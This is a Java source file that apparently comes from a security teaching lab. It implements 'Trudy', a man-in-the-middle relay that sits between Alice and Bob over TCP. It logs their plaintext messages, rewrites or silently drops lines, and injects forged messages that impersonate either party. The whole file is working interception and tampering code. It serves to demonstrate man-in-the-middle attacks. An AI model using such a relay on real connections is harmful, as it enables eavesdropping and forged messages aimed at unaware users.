package com.herrcult69.metm;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Trudy {
    private static final String TAG = "Trudy";
    private static final String END = "EOF END";

    // live attack state, toggled from Trudy's keyboard
    private static volatile String findText = null;      // /replace a=b
    private static volatile String replaceText = null;
    private static volatile String dropText = null;      // /drop xyz

    public static void main(String[] args) throws IOException {
        int listenPort = args.length > 0 ? Integer.parseInt(args[0]) : 6000;   // iptables REDIRECTs here
        String bobHost = args.length > 1 ? args[1] : "192.168.0.152";          // real Bob
        int bobPort    = args.length > 2 ? Integer.parseInt(args[2]) : 9000;

        try (ServerSocket server = new ServerSocket(listenPort)) {
            Log.info(TAG, "listening on " + listenPort + "; will relay to real Bob at "
                    + bobHost + ":" + bobPort);
            Socket alice = server.accept();
            Log.info(TAG, "Alice connected from " + alice.getRemoteSocketAddress());
            Socket bob = new Socket(bobHost, bobPort);
            Log.info(TAG, "connected onward to Bob at " + bob.getRemoteSocketAddress());

            PrintWriter toAlice = new PrintWriter(alice.getOutputStream(), true);
            PrintWriter toBob   = new PrintWriter(bob.getOutputStream(), true);
            BufferedReader fromAlice = new BufferedReader(new InputStreamReader(alice.getInputStream()));
            BufferedReader fromBob   = new BufferedReader(new InputStreamReader(bob.getInputStream()));

            // Two independent directions, because either side may speak at any time.
            Thread a2b = new Thread(() -> pump("Alice->Bob", fromAlice, toBob), "a2b");
            Thread b2a = new Thread(() -> pump("Bob->Alice", fromBob, toAlice), "b2a");
            a2b.setDaemon(true);
            b2a.setDaemon(true);
            a2b.start();
            b2a.start();

            operatorConsole(toAlice, toBob);   // Trudy's keyboard: forge lines
        }
    }

    /** Relay one direction. 'peerOut' is the far side we forward to. */
    private static void pump(String dir, BufferedReader in, PrintWriter peerOut) {
        try {
            String line;
            while ((line = in.readLine()) != null) {
                if (line.equals(END)) {
                    Log.info(TAG, dir + ": EOF END seen, closing");
                    synchronized (peerOut) { peerOut.println(END); }
                    break;
                }
                // DROP: swallow silently, neither side is told.
                if (dropText != null && line.contains(dropText)) {
                    Log.info(TAG, dir + ": DROPPED (" + line + ")");
                    continue;
                }
                // TAMPER: rewrite in flight.
                String out = line;
                if (findText != null && line.contains(findText)) {
                    out = line.replace(findText, replaceText);
                    Log.info(TAG, dir + ": TAMPERED \"" + line + "\" -> \"" + out + "\"");
                } else {
                    Log.info(TAG, dir + ": " + line);
                }
                synchronized (peerOut) { peerOut.println(out); }
            }
        } catch (IOException e) {
            Log.error(TAG, dir + ": " + e);
        }
        System.exit(0);
    }

    /** Trudy's own keyboard: inject forged lines into either side. */
    private static void operatorConsole(PrintWriter toAlice, PrintWriter toBob) throws IOException {
        BufferedReader k = new BufferedReader(new InputStreamReader(System.in));
        help();
        String cmd;
        while ((cmd = k.readLine()) != null) {
            if (cmd.startsWith("/toalice ")) {
                String text = cmd.substring("/toalice ".length());
                synchronized (toAlice) { toAlice.println(text); }
                Log.info(TAG, "INJECTED to Alice (as Bob): " + text);
            } else if (cmd.startsWith("/tobob ")) {
                String text = cmd.substring("/tobob ".length());
                synchronized (toBob) { toBob.println(text); }
                Log.info(TAG, "INJECTED to Bob (as Alice): " + text);
            } else if (cmd.startsWith("/replace ")) {
                String body = cmd.substring("/replace ".length());
                int eq = body.indexOf('=');
                if (eq > 0) {
                    findText = body.substring(0, eq);
                    replaceText = body.substring(eq + 1);
                    Log.info(TAG, "tamper ON: \"" + findText + "\" -> \"" + replaceText + "\"");
                } else {
                    Log.info(TAG, "usage: /replace find=replacement");
                }
            } else if (cmd.equals("/noreplace")) {
                findText = null;
                replaceText = null;
                Log.info(TAG, "tamper OFF");
            } else if (cmd.startsWith("/drop ")) {
                dropText = cmd.substring("/drop ".length());
                Log.info(TAG, "drop ON for lines containing: " + dropText);
            } else if (cmd.equals("/nodrop")) {
                dropText = null;
                Log.info(TAG, "drop OFF");
            } else if (cmd.equals("/help")) {
                help();
            } else {
                Log.info(TAG, "unknown command; /help for the list");
            }
        }
    }

    private static void help() {
        Log.info(TAG, "commands: /toalice <msg>  /tobob <msg>  /replace a=b  "
                + "/noreplace  /drop x  /nodrop  /help");
    }
}
